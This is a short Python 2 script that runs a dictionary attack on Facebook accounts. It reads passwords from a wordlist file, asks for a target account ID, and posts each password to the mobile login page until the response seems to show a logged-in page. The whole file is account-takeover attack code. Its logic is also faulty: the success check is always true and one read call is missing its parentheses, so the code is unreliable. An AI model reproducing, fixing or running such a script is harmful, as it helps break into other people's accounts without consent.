import requests
import sys
import random
from urllib2 import Request, urlopen

url='https://free.facebook.com/login.php'
response = urlopen(url).read
print(response)
file = open("password.txt", "r").readlines()

email = raw_input('Id > ')

for state in file:
	password = state.strip()
	http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
	content = http.content
	if "Beranda" or "Profil" or "obrolan" or "pesan" in content:
		print "[+] Password Found ! > ",password
		sys.exit(1)
	else:
		print "[!] Invalid Password ! > ",password
